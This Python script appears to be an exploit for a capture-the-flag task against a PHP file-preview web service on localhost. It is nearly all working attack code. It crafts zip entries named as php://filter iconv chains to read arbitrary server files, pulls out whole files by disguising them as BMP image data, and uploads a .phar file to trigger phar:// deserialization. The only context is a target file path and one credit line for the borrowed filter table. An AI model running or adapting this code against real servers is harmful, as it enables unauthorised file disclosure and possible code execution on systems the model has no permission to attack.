import requests
import zipfile
from base64 import b64encode, b64decode
from PIL import Image
from io import BytesIO

filters = {
    "utf7": "convert.iconv.UTF8.UTF7",
    "b64e": "convert.base64-encode",
    "b64d": "convert.base64-decode",
    "magic": "convert.iconv.UTF8.CSISO2022KR",
    "0": "convert.iconv.UTF8.UTF16LE/convert.iconv.UTF8.CSISO2022KR/convert.iconv.UCS2.UTF8/convert.iconv.8859_3.UCS2",
    "1": "convert.iconv.ISO88597.UTF16/convert.iconv.RK1048.UCS-4LE/convert.iconv.UTF32.CP1167/convert.iconv.CP9066.CSUCS4",
    "2": "convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.CP949.UTF32BE/convert.iconv.ISO_69372.CSIBM921",
    "3": "convert.iconv.L6.UNICODE/convert.iconv.CP1282.ISO-IR-90/convert.iconv.ISO6937.8859_4/convert.iconv.IBM868.UTF-16LE",
    "4": "convert.iconv.CP866.CSUNICODE/convert.iconv.CSISOLATIN5.ISO_6937-2/convert.iconv.CP950.UTF-16BE",
    "5": "convert.iconv.UTF8.UTF16LE/convert.iconv.UTF8.CSISO2022KR/convert.iconv.UTF16.EUCTW/convert.iconv.8859_3.UCS2",
    "6": "convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.CSIBM943.UCS4/convert.iconv.IBM866.UCS-2",
    "7": "convert.iconv.851.UTF-16/convert.iconv.L1.T.618BIT/convert.iconv.ISO-IR-103.850/convert.iconv.PT154.UCS4",
    "8": "convert.iconv.ISO2022KR.UTF16/convert.iconv.L6.UCS2",
    "9": "convert.iconv.CSIBM1161.UNICODE/convert.iconv.ISO-IR-156.JOHAB",
    "A": "convert.iconv.8859_3.UTF16/convert.iconv.863.SHIFT_JISX0213",
    "a": "convert.iconv.CP1046.UTF32/convert.iconv.L6.UCS-2/convert.iconv.UTF-16LE.T.61-8BIT/convert.iconv.865.UCS-4LE",
    "B": "convert.iconv.CP861.UTF-16/convert.iconv.L4.GB13000",
    "b": "convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.iconv.UCS-2.OSF00030010/convert.iconv.CSIBM1008.UTF32BE",
    "C": "convert.iconv.UTF8.CSISO2022KR",
    "c": "convert.iconv.L4.UTF32/convert.iconv.CP1250.UCS-2",
    "D": "convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.IBM932.SHIFT_JISX0213",
    "d": "convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.GBK.BIG5",
    "E": "convert.iconv.IBM860.UTF16/convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "e": "convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.iconv.UTF16.EUC-JP-MS/convert.iconv.ISO-8859-1.ISO_6937",
    "F": "convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.CP950.SHIFT_JISX0213/convert.iconv.UHC.JOHAB",
    "f": "convert.iconv.CP367.UTF-16/convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM921.NAPLPS/convert.iconv.855.CP936/convert.iconv.IBM-932.UTF-8",
    "G": "convert.iconv.L6.UNICODE/convert.iconv.CP1282.ISO-IR-90",
    "H": "convert.iconv.CP1046.UTF16/convert.iconv.ISO6937.SHIFT_JISX0213",
    "h": "convert.iconv.CSGB2312.UTF-32/convert.iconv.IBM-1161.IBM932/convert.iconv.GB13000.UTF16BE/convert.iconv.864.UTF-32LE",
    "I": "convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.BIG5.SHIFT_JISX0213",
    "i": "convert.iconv.DEC.UTF-16/convert.iconv.ISO8859-9.ISO_6937-2/convert.iconv.UTF16.GB13000",
    "J": "convert.iconv.863.UNICODE/convert.iconv.ISIRI3342.UCS4",
    "j": "convert.iconv.CP861.UTF-16/convert.iconv.L4.GB13000/convert.iconv.BIG5.JOHAB/convert.iconv.CP950.UTF16",
    "K": "convert.iconv.863.UTF-16/convert.iconv.ISO6937.UTF16LE",
    "k": "convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2",
    "L": "convert.iconv.IBM869.UTF16/convert.iconv.L3.CSISO90/convert.iconv.R9.ISO6937/convert.iconv.OSF00010100.UHC",
    "l": "convert.iconv.CP-AR.UTF16/convert.iconv.8859_4.BIG5HKSCS/convert.iconv.MSCP1361.UTF-32LE/convert.iconv.IBM932.UCS-2BE",
    "M": "convert.iconv.CP869.UTF-32/convert.iconv.MACUK.UCS4/convert.iconv.UTF16BE.866/convert.iconv.MACUKRAINIAN.WCHAR_T",
    "m": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM921.NAPLPS/convert.iconv.CP1163.CSA_T500/convert.iconv.UCS-2.MSCP949",
    "N": "convert.iconv.CP869.UTF-32/convert.iconv.MACUK.UCS4",
    "n": "convert.iconv.ISO88594.UTF16/convert.iconv.IBM5347.UCS4/convert.iconv.UTF32BE.MS936/convert.iconv.OSF00010004.T.61",
    "O": "convert.iconv.CSA_T500.UTF-32/convert.iconv.CP857.ISO-2022-JP-3/convert.iconv.ISO2022JP2.CP775",
    "o": "convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.iconv.UCS-4LE.OSF05010001/convert.iconv.IBM912.UTF-16LE",
    "P": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.MS932.MS936/convert.iconv.BIG5.JOHAB",
    "p": "convert.iconv.IBM891.CSUNICODE/convert.iconv.ISO8859-14.ISO6937/convert.iconv.BIG-FIVE.UCS-4",
    "q": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.GBK.CP932/convert.iconv.BIG5.UCS2",
    "Q": "convert.iconv.L6.UNICODE/convert.iconv.CP1282.ISO-IR-90/convert.iconv.CSA_T500-1983.UCS-2BE/convert.iconv.MIK.UCS2",
    "R": "convert.iconv.PT.UTF32/convert.iconv.KOI8-U.IBM-932/convert.iconv.SJIS.EUCJP-WIN/convert.iconv.L10.UCS4",
    "r": "convert.iconv.IBM869.UTF16/convert.iconv.L3.CSISO90/convert.iconv.ISO-IR-99.UCS-2BE/convert.iconv.L4.OSF00010101",
    "S": "convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.GBK.SJIS",
    "s": "convert.iconv.IBM869.UTF16/convert.iconv.L3.CSISO90",
    "T": "convert.iconv.L6.UNICODE/convert.iconv.CP1282.ISO-IR-90/convert.iconv.CSA_T500.L4/convert.iconv.ISO_8859-2.ISO-IR-103",
    "t": "convert.iconv.864.UTF32/convert.iconv.IBM912.NAPLPS",
    "U": "convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943",
    "u": "convert.iconv.CP1162.UTF32/convert.iconv.L4.T.61",
    "V": "convert.iconv.CP861.UTF-16/convert.iconv.L4.GB13000/convert.iconv.BIG5.JOHAB",
    "v": "convert.iconv.UTF8.UTF16LE/convert.iconv.UTF8.CSISO2022KR/convert.iconv.UTF16.EUCTW/convert.iconv.ISO-8859-14.UCS2",
    "W": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.MS932.MS936",
    "w": "convert.iconv.MAC.UTF16/convert.iconv.L8.UTF16BE",
    "X": "convert.iconv.PT.UTF32/convert.iconv.KOI8-U.IBM-932",
    "x": "convert.iconv.CP-AR.UTF16/convert.iconv.8859_4.BIG5HKSCS",
    "Y": "convert.iconv.CP367.UTF-16/convert.iconv.CSIBM901.SHIFT_JISX0213/convert.iconv.UHC.CP1361",
    "y": "convert.iconv.851.UTF-16/convert.iconv.L1.T.618BIT",
    "Z": "convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.BIG5HKSCS.UTF16",
    "z": "convert.iconv.865.UTF16/convert.iconv.CP901.ISO6937",
    "/": "convert.iconv.IBM869.UTF16/convert.iconv.L3.CSISO90/convert.iconv.UCS2.UTF-8/convert.iconv.CSISOLATIN6.UCS-4",
    "+": "convert.iconv.UTF8.UTF16/convert.iconv.WINDOWS-1258.UTF32LE/convert.iconv.ISIRI3342.ISO-IR-157",
}
# character filters taken from https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py


class ExploitBuilder:
    @staticmethod
    def readfile_extended_filterchain(prefix, filename, extra_encode=False):
        chain = [filters["b64e"]] if extra_encode else []
        chain += [filters["magic"], filters["b64e"], filters["utf7"]]

        for c in prefix[::-1]:
            chain += [filters[c], filters["b64d"], filters["b64e"], filters["utf7"]]

        chain.append(filters["b64d"])
        chain = "/".join(chain)

        return f"php:/Qfilter/{chain}/resource={filename}"

    @staticmethod
    def readfile_filter_base64(filename):
        return f"php:/Qfilter/{filters['b64e']}/resource={filename}"

    @staticmethod
    def gen_zip(files, patchsequence=None):
        if type(files) is str:
            files = [files]

        with zipfile.ZipFile("exp.zip", "w", zipfile.ZIP_DEFLATED) as zip:
            for file in files:
                zip.write("null.txt", file)

        if patchsequence:  # python can't do //
            with open("exp.zip", "rb") as f:
                data = f.read()
            data = data.replace(patchsequence[0], patchsequence[1])
            with open("exp.zip", "wb") as f:
                f.write(data)

    @staticmethod
    def gen_bmp_header(width, height):
        bits_per_pixel = 24

        file_header_size = 14
        dib_header_size = 40
        bytes_per_row = ((bits_per_pixel * width + 31) // 32) * 4
        image_size = bytes_per_row * height
        file_size = file_header_size + dib_header_size + image_size

        bmp_header = bytearray()

        # BMP Header (14 bytes)
        bmp_header.extend(b"BM")
        bmp_header.extend(file_size.to_bytes(4, byteorder="little"))
        bmp_header.extend((0).to_bytes(4, byteorder="little"))
        bmp_header.extend(
            (file_header_size + dib_header_size).to_bytes(4, byteorder="little")
        )

        # DIB Header (40 bytes)
        bmp_header.extend(dib_header_size.to_bytes(4, byteorder="little"))
        bmp_header.extend(width.to_bytes(4, byteorder="little"))  # width
        bmp_header.extend(height.to_bytes(4, byteorder="little"))  # height
        bmp_header.extend((1).to_bytes(2, byteorder="little"))
        bmp_header.extend(bits_per_pixel.to_bytes(2, byteorder="little"))
        bmp_header.extend((0).to_bytes(4, byteorder="little"))
        bmp_header.extend(image_size.to_bytes(4, byteorder="little"))
        bmp_header.extend((0).to_bytes(16, byteorder="little"))

        return bmp_header


class Service:
    target = "http://localhost:5000"

    @staticmethod
    def upload_file(filename="exp.zip"):
        with open(filename, "rb") as f:
            res = requests.post(f"{Service.target}/upload", files={"file": f}).text
            if "ERR:" in res:
                print(res)
            else:
                return res

    @staticmethod
    def preview_file(uuid):
        return requests.get(f"{Service.target}/preview/{uuid}").json()

    @staticmethod
    def process_file(filename="exp.zip"):
        uuid = Service.upload_file()
        if uuid:
            return Service.preview_file(uuid)


class Interactor:
    @staticmethod
    def readfile_limited(filename):
        ExploitBuilder.gen_zip(filename)
        print(Service.process_file()["content"][0]["content"])

    @staticmethod
    def readfile_binary_limited(filename):
        ExploitBuilder.gen_zip(
            ExploitBuilder.readfile_filter_base64(filename), (b":/Q", b"://")
        )
        print(Service.process_file()["content"][0]["content"])

    @staticmethod
    def readfile_full(
        filename,
        is_binary=False,
        cf=48400,
        max_dim=368
    ):
        max_size_guess = max_dim * max_dim * 3

        def try_size(size):
            size //= 3
            bmp_header = b64encode(
                ExploitBuilder.gen_bmp_header(
                    size if size < max_dim else max_dim, size // max_dim + 1
                )
            ).decode()  # change this line and cf variable in order to not lose ending chunk
            r = try_file(bmp_header)
            return r["type"] == "image", r["content"]

        def try_file(header):
            filterchain = ExploitBuilder.readfile_extended_filterchain(
                header, filename, is_binary
            )
            ExploitBuilder.gen_zip(filterchain, (b":/Q", b"://"))
            return Service.process_file()["content"][0]

        resp = try_size(cf)
        if not resp[0]:
            return print("failed :(")

        image_data = b64decode(resp[1][22:].encode())
        img = Image.open(BytesIO(image_data))
        pixeldata = img.load()
        w, h = img.size

        data = ""
        for y in reversed(range(h)):
            for x in range(w):
                data += "".join(reversed([chr(i) for i in list(pixeldata[x, y])]))

        return data

    @staticmethod
    def send_phar(filename="vzlom.phar"):
        uuid = Service.upload_file(filename)
        ExploitBuilder.gen_zip(f"phar:/Q/uploads/{uuid}.phar", (b":/Q", b"://"))
        print(Service.process_file()["content"][0]["content"])


def main():
    print(Interactor.readfile_full('/var/www/html/blobus.txt', cf=225200))
    # Interactor.send_phar()


if __name__ == "__main__":
    main()
